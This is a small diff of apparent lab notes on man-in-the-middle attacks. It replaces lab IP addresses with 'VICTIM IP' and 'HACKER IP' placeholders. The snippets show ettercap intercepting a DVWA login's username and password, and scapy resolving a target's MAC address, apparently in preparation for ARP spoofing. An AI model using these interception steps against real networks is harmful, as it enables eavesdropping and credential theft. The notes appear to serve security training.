@@ -19,7 +19,7 @@ lets use ettercap
 
     ettercap -G
 
-    HTTP : 192.168.88.38:80 -> USER: admin  PASS: test  INFO: http://192.168.88.38/dvwa/login.php
+    HTTP : <VICTIM IP>:80 -> USER: admin  PASS: test  INFO: http://<VICTIM IP>/dvwa/login.php
     CONTENT: username=admin&password=test&Login=Login
 
 
@@ -35,7 +35,7 @@ scapy
     answer = srp(entire_packet, timeout=2, verbose=True)[0]
 
     print(answer[0])
-    (<Ether  dst=ff:ff:ff:ff:ff:ff type=ARP |<ARP  pdst=192.168.88.87 |>>, <Ether  dst=08:00:27:c7:e1:36 src=2c:0d:a7:6f:e7:21 type=ARP |<ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=2c:0d:a7:6f:e7:21 psrc=192.168.88.87 hwdst=08:00:27:c7:e1:36 pdst=192.168.88.13 |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>>)
+    (<Ether  dst=ff:ff:ff:ff:ff:ff type=ARP |<ARP  pdst=192.168.88.87 |>>, <Ether  dst=08:00:27:c7:e1:36 src=2c:0d:a7:6f:e7:21 type=ARP |<ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=2c:0d:a7:6f:e7:21 psrc=192.168.88.87 hwdst=08:00:27:c7:e1:36 pdst=<HACKER IP> |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>>)
     => MAC address = 2c:0d:a7:6f:e7:21
 
     target_mac = '2c:0d:a7:6f:e7:21'
